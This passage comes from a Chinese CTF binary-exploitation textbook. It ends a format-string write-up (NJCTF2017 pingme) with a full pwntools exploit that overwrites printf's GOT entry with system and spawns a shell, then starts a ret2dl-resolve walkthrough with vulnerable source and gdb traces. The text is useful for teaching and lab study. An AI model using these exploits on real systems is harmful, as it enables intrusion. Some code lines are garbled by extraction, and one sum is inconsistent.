0x08049975
0x08049976
0x08049977
然后是格式字符串 %64c%7$hhn%76c%8hhn%67c%9$hhn%24c%10$hhn ：
16 + 64 = 80 = 0x50
80 + 76 = 156 = 0x9c
156 + 67 = 223 = 0xdf
233 + 24 = 247 = 0xf7
就这样将 system 的地址写入了内存。
Bingo!!!
$ python2 exp.py
[+] Opening connection to 127.0.0.2 on port 10001: Done
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
from pwn import *
# context.log_level = 'debug'
def exec_fmt(payload):
p.sendline(payload)
info = p.recv()
return info
# p = remote('127.0.0.1', '10001')
# p.recvline()
# auto = FmtStr(exec_fmt)
901
6.1.2 pwn NJCTF2017 pingme
# offset = auto.offset
# p.close()
def dump_memory(start_addr, end_addr):
result = ""
while start_addr  %s" % (start_addr, data.enco
de('hex')))
result += data
start_addr += len(data)
p.close()
return result
# start_addr = 0x8048000
# end_addr = 0x8049000
# code_bin = dump_memory(start_addr, end_addr)
# with open("code.bin", "wb") as f:
# f.write(code_bin)
# f.close()
printf_got = 0x8049974
## method 1
def get_printf_addr():
p = remote('127.0.0.1', '10001')
p.recvline()
payload = "%9$s.AAA" + p32(printf_got)
p.sendline(payload)
data = p.recvuntil(".AAA")[:4]
log.info("printf address: %s" % data.encode('hex'))
return data
# printf_addr = get_printf_addr()
printf_addr = 0xf7e0e670
offset_printf = 0x00051670
902
6.1.2 pwn NJCTF2017 pingme
offset_system = 0x0003cc50
system_addr = printf_addr - (offset_printf - offset_system)
## method 2
def leak(addr):
p = remote('127.0.0.1', '10001')
p.recvline()
payload = "%9$s.AAA" + p32(addr)
p.sendline(payload)
data = p.recvuntil(".AAA")[:-4] + "\x00"
log.info("leaking: 0x%x --> %s" % (addr, data.encode('hex'))
)
p.close()
return data
# data = DynELF(leak, 0x08048490) # Entry point address
# system_addr = data.lookup('system', 'libc')
# printf_addr = data.lookup('printf', 'libc')
# log.info("system address: 0x%x" % system_addr)
# log.info("printf address: 0x%x" % printf_addr)
## get shell
payload = fmtstr_payload(7, {printf_got: system_addr})
p = remote('127.0.1.1', '10001')
p.recvline()
p.sendline(payload)
p.recv()
p.sendline('/bin/sh')
p.interactive()
参考资料
Linux系统下格式化字符串利用研究
33C3 CTF 2016 -- ESPR
903
6.1.3 pwn XDCTF2015 pwn200
6.1.3 pwn XDCTF2015 pwn200
题目复现
ret2dl-resolve 原理及题目解析
漏洞利用
参考资料
下载文件
题目复现
出题人在博客里贴出了源码，如下：
#include 
#include 
#include 
void vuln()
{
char buf[100];
setbuf(stdin, buf);
read(0, buf, 256);
}
int main()
{
char buf[100] = "Welcome to XDCTF2015~!\n";
setbuf(stdout, buf);
write(1, buf, strlen(buf));
vuln();
return 0;
}
使用下面的语句编译：
904
6.1.3 pwn XDCTF2015 pwn200
$ gcc -m32 -fno-stack-protector -no-pie -s pwn200.c
checksec 如下：
$ checksec -f a.out
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO No canary found NX enabled No PIE
No RPATH No RUNPATH No 0 1 a.out
在开启 ASLR 的情况下把程序运行起来：
$ socat tcp4-listen:10001,reuseaddr,fork exec:./a.out &
这题提供了二进制文件而没有提供 libc.so，而且也默认找不到，在章节 4.8 中我们
提供了一种解法，这里我们讲解另一种。
ret2dl-resolve 原理及题目解析
这种利用的技术是在 2015 年的论文 “How the ELF Ruined Christmas” 中提出的，
论文地址在参考资料中。ret2dl-resolve 不需要信息泄露，而是通过动态装载器来直
接标识关键函数的位置并调用它们。它可以绕过多种安全缓解措施，包括专门为保
护 ELF 数据结构不被破坏而设计的 RELRO。而在 ctf 中，我们也能看到它的身
影，通常用于对付无法获得目标系统 libc.so 的情况。
延迟绑定
关于动态链接我们在章节 1.5.6 中已经讲过了，这里就重点讲一下动态解析的过
程。我们知道，在动态链接中，如果程序没有开启 Full RELRO 保护，则存在延迟
绑定的过程，即库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成
绑定。
一个动态链接程序的程序头表中会包含类型为 PT_DYNAMIC 的段，它包含了
.dynamic 段，结构如下：
905
6.1.3 pwn XDCTF2015 pwn200
typedef struct
{
Elf32_Sword d_tag; /* Dynamic entry type */
union
{
Elf32_Word d_val; /* Integer value */
Elf32_Addr d_ptr; /* Address value */
} d_un;
} Elf32_Dyn;
typedef struct
{
Elf64_Sxword d_tag; /* Dynamic entry type */
union
{
Elf64_Xword d_val; /* Integer value */
Elf64_Addr d_ptr; /* Address value */
} d_un;
} Elf64_Dyn;
一个 Elf_Dyn 是一个键值对，其中 d_tag 是键， d_value 是值。其中有个
例外的条目是 DT_DEBUG ，它保存了动态装载器内部数据结构的指针。
段表结构如下：
906
6.1.3 pwn XDCTF2015 pwn200
typedef struct
{
Elf32_Word sh_name; /* Section name (string tbl inde
x) */
Elf32_Word sh_type; /* Section type */
Elf32_Word sh_flags; /* Section flags */
Elf32_Addr sh_addr; /* Section virtual addr at execu
tion */
Elf32_Off sh_offset; /* Section file offset */
Elf32_Word sh_size; /* Section size in bytes */
Elf32_Word sh_link; /* Link to another section */
Elf32_Word sh_info; /* Additional section informatio
n */
Elf32_Word sh_addralign; /* Section alignment */
Elf32_Word sh_entsize; /* Entry size if section holds t
able */
} Elf32_Shdr;
typedef struct
{
Elf64_Word sh_name; /* Section name (string tbl inde
x) */
Elf64_Word sh_type; /* Section type */
Elf64_Xword sh_flags; /* Section flags */
Elf64_Addr sh_addr; /* Section virtual addr at execu
tion */
Elf64_Off sh_offset; /* Section file offset */
Elf64_Xword sh_size; /* Section size in bytes */
Elf64_Word sh_link; /* Link to another section */
Elf64_Word sh_info; /* Additional section informatio
n */
Elf64_Xword sh_addralign; /* Section alignment */
Elf64_Xword sh_entsize; /* Entry size if section holds t
able */
} Elf64_Shdr;
具体来看，首先在 write@plt 地址处下断点，然后运行：
gdb-peda$ p write
907
6.1.3 pwn XDCTF2015 pwn200
$1 = {} 0x8048430 
gdb-peda$ b *0x8048430
Breakpoint 1 at 0x8048430
gdb-peda$ r
Starting program: /home/firmy/Desktop/RE4B/200/a.out
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd5bc ("Welcome to XDCTF2015~!\n")
EBX: 0x804a000 --> 0x8049f04 --> 0x1
ECX: 0x2a8c
EDX: 0x3
ESI: 0xf7f8ee28 --> 0x1d1d30
EDI: 0xffffd620 --> 0x1
EBP: 0xffffd638 --> 0x0
ESP: 0xffffd59c --> 0x804861b (add esp,0x10)
EIP: 0x8048430 (: jmp DWORD PTR ds:0x804a01c)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048420 : jmp DWORD PTR ds:0x80
4a018
0x8048426 : push 0x18
0x804842b : jmp 0x80483e0
=> 0x8048430 : jmp DWORD PTR ds:0x804a01c
| 0x8048436 : push 0x20
| 0x804843b : jmp 0x80483e0
| 0x8048440: jmp DWORD PTR ds:0x8049ff0
| 0x8048446: xchg ax,ax
|-> 0x8048436 : push 0x20
0x804843b : jmp 0x80483e0
0x8048440: jmp DWORD PTR ds:0x8049ff0
0x8048446: xchg ax,ax
JUMP is taken
[------------------------------------stack----------------------
---------------]
0000| 0xffffd59c --> 0x804861b (add esp,0x10)
0004| 0xffffd5a0 --> 0x1
0008| 0xffffd5a4 --> 0xffffd5bc ("Welcome to XDCTF2015~!\n")
908
6.1.3 pwn XDCTF2015 pwn200
0012| 0xffffd5a8 --> 0x17
0016| 0xffffd5ac --> 0x80485a4 (add ebx,0x1a5c)
0020| 0xffffd5b0 --> 0xffffd5ea --> 0x0
0024| 0xffffd5b4 --> 0xf7ffca64 --> 0x6
0028| 0xffffd5b8 --> 0xf7ffca68 --> 0x3c (' 0x8049f04 --> 0x1
ECX: 0x2a8c
EDX: 0x3
ESI: 0xf7f8ee28 --> 0x1d1d30
EDI: 0xffffd620 --> 0x1
EBP: 0xffffd638 --> 0x0
ESP: 0xffffd59c --> 0x804861b (add esp,0x10)
EIP: 0x8048436 (: push 0x20)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048426 : push 0x18
0x804842b : jmp 0x80483e0
0x8048430 : jmp DWORD PTR ds:0x804a01c
=> 0x8048436 : push 0x20